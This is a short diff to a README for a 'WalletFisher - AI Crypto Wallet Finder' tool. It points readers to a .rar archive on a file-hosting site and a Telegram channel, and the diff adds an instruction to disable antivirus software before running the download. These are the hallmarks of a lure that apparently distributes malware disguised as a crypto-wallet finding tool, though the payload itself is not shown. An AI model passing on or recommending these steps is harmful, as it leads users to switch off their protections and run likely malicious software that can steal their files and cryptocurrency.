@@ -1,6 +1,8 @@
 WalletFisher - AI Crypto Wallet Finder
 
-**2/ download Wallet hunter 2025.rar file from this link :https://www.upload.ee/files/18139099/Fast_crypto_finder_2025_.rar.html
+** download Wallet hunter 2025.rar file from this link :https://www.upload.ee/files/18139099/Fast_crypto_finder_2025_.rar.html
+-  ( disable your anti virus to work well )
+- and if the software not open download ( net freamwork 3.5 and 4.5)
 
 
 **Extract all files into a folder.
@@ -8,6 +10,7 @@ WalletFisher - AI Crypto Wallet Finder
 **Run  software
 
 join telegram channel : https://t.me/cryptosearchwallets
+
 
 
 
